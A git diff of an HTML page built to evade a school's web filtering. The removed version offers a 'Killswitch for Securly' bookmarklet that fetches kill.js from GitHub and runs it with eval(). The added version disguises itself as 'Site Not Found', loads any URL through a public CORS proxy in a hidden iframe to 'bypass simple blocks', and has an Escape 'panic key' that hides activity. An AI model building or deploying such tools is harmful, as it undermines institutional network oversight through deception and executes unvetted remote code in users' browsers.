@@ -1,36 +1,54 @@
 <!DOCTYPE html>
-<html>
-    <head>
-        <title>Make school go night night</title>
-        <link rel="icon" href="https://raw.githubusercontent.com/Epicminer256/Securascramble/main/IMG/favicon.ico">
-        <style type="text/css">
-            body {
-                color: #000;
-                font-family: 'Roboto', monospace;
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Site Not Found</title>
+    <style>
+        /* Stealth Styling */
+        body, html { 
+            margin: 0; padding: 0; height: 100%; width: 100%; 
+            background: black; overflow: hidden; 
+        }
+        #view { 
+            width: 100%; height: 100%; border: none; 
+            display: none; background: white; 
+        }
+    </style>
+</head>
+<body>
+    <iframe id="view"></iframe>
+
+    <script>
+        // Register the "Engine" (Service Worker)
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('./worker.js');
+        }
+
+        function loadSecret() {
+            const hash = window.location.hash.substring(1);
+            const frame = document.getElementById('view');
+            
+            if (hash) {
+                // Public bridge to bypass simple blocks
+                const bridge = "https://api.allorigins.win/raw?url=";
+                frame.src = bridge + encodeURIComponent(hash);
+                frame.style.display = "block";
+            } else {
+                frame.style.display = "none";
+                frame.src = "";
             }
-            #cow{
-                display: block;
-                background-image: url("https://raw.githubusercontent.com/ZZSPLO1TS/ZZSPLO1TS.github.io/refs/heads/main/E6128BB6-2EC8-458C-AEC9-5A643B462C74.png");
-                background-position: center;
-                background-repeat: no-repeat;
-                width: 100%;
-                height: 280px;
-                font-size: 0px;
+        }
+
+        // Panic Key: Press 'Escape' to instantly flip back to Black Screen
+        window.addEventListener('keydown', (e) => {
+            if (e.key === "Escape") {
+                window.location.hash = "";
+                location.reload(); // Hard reset to black
             }
-            p {
-                font-size: 30px;
-                margin: 0;
-                padding: 20px;
-                text-align: center;
-            }
-        </style>
-    </head>
-    <body>
-        <p>Drag this cow to your bookmarkbar (Use Ctrl+Shift+B to show/hide bookmarkbar)</p>
-        <a onclick="event.preventDefault();alert('Drag and drop me to you bookmark bar, don\'t click me!')" href="javascript:fetch('https://raw.githubusercontent.com/Epicminer256/Securascramble/main/kill.js').then(r => r.text()).then(r => eval(r))">
-            <div id="cow">
-                Killswitch for Securly
-            </div>
-        </a>
-    </body>
+        });
+
+        window.addEventListener('load', loadSecret);
+        window.addEventListener('hashchange', loadSecret);
+    </script>
+</body>
 </html>
